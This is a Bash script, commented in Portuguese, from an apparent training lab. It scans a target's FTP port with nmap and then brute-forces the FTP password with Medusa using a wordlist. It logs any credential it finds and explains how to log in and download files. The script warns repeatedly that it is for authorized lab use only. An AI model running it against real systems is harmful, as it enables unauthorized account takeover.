#!/bin/bash

# ==========================================================
# 02 — Ataque Controlado de Força Bruta em FTP com Medusa
# Projeto: Brute Force Lab com Kali Linux e Medusa
# Uso autorizado apenas em laboratório local/controlado.
# ==========================================================

clear

LOGS_DIR="logs"
mkdir -p "$LOGS_DIR"

echo "=================================================="
echo " 02 — Ataque FTP com Medusa"
echo "=================================================="
echo

echo "[!] Este script executa um teste controlado de autenticação FTP."
echo "[!] Use somente contra máquinas próprias, vulneráveis e autorizadas."
echo

read -p "Informe o IP do alvo. Exemplo: 192.168.56.101: " TARGET
read -p "Informe o usuário FTP. Exemplo: msfadmin: " USERNAME
read -p "Informe o caminho da wordlist de senhas. Exemplo: wordlists/passwords.txt: " PASSWORD_LIST

echo

if [ -z "$TARGET" ] || [ -z "$USERNAME" ] || [ -z "$PASSWORD_LIST" ]; then
    echo "[-] IP, usuário ou wordlist não informado. Encerrando."
    exit 1
fi

LOG_FILE="$LOGS_DIR/ftp-results-$(date +%Y%m%d-%H%M%S).txt"

echo "=================================================="
echo "[1] Verificação de dependências"
echo "=================================================="

for tool in medusa nmap ftp; do
    if command -v "$tool" >/dev/null 2>&1; then
        echo "[+] $tool encontrado."
    else
        echo "[-] $tool não encontrado."
        echo "    Instale com: sudo apt install $tool -y"
        exit 1
    fi
done

if [ -f "$PASSWORD_LIST" ]; then
    PASS_COUNT=$(wc -l < "$PASSWORD_LIST")
    echo "[+] Wordlist encontrada: $PASSWORD_LIST ($PASS_COUNT senhas)"
else
    echo "[-] Wordlist não encontrada: $PASSWORD_LIST"
    exit 1
fi

echo

echo "=================================================="
echo "[2] Verificação da porta FTP"
echo "=================================================="
nmap -sV -p 21 "$TARGET"

FTP_STATUS=$(nmap -p 21 "$TARGET" | grep "21/tcp" | awk '{print $2}')
if [ "$FTP_STATUS" != "open" ]; then
    echo "[-] Porta 21 não está aberta no alvo. Verifique o IP e a conectividade."
    exit 1
fi

echo "[+] Porta 21 confirmada como aberta."
echo

read -p "Deseja continuar com o teste FTP usando Medusa? (s/n): " CONFIRM

if [[ "$CONFIRM" != "s" && "$CONFIRM" != "S" ]]; then
    echo "[-] Execução cancelada pelo usuário."
    exit 0
fi

echo
echo "=================================================="
echo "[3] Execução do Medusa"
echo "=================================================="
echo "[+] Alvo:     $TARGET"
echo "[+] Usuário:  $USERNAME"
echo "[+] Wordlist: $PASSWORD_LIST ($PASS_COUNT senhas)"
echo "[+] Log:      $LOG_FILE"
echo

# -O grava o log com credenciais encontradas (evidência documentada)
# -f para ao encontrar a primeira credencial válida
medusa -h "$TARGET" -u "$USERNAME" -P "$PASSWORD_LIST" -M ftp -f -O "$LOG_FILE"

echo
echo "=================================================="
echo "[4] Resultado"
echo "=================================================="

if grep -q "ACCOUNT FOUND" "$LOG_FILE" 2>/dev/null; then
    FOUND_CRED=$(grep "ACCOUNT FOUND" "$LOG_FILE")
    echo "[+] Credencial válida encontrada!"
    echo "    $FOUND_CRED"
    echo "[+] Log completo salvo em: $LOG_FILE"
else
    echo "[-] Nenhuma credencial válida encontrada na wordlist."
    echo "[+] Log salvo em: $LOG_FILE"
fi

echo
echo "=================================================="
echo "[5] Validação manual"
echo "=================================================="
echo "Se uma credencial foi encontrada, valide com:"
echo
echo "  ftp $TARGET"
echo
echo "Informe o usuário e senha encontrados."
echo "Comandos úteis dentro do FTP:"
echo "  pwd   → diretório atual"
echo "  ls    → listar arquivos"
echo "  get   → baixar arquivo"
echo "  quit  → encerrar conexão"
echo

echo "=================================================="
echo " Teste FTP finalizado"
echo "=================================================="
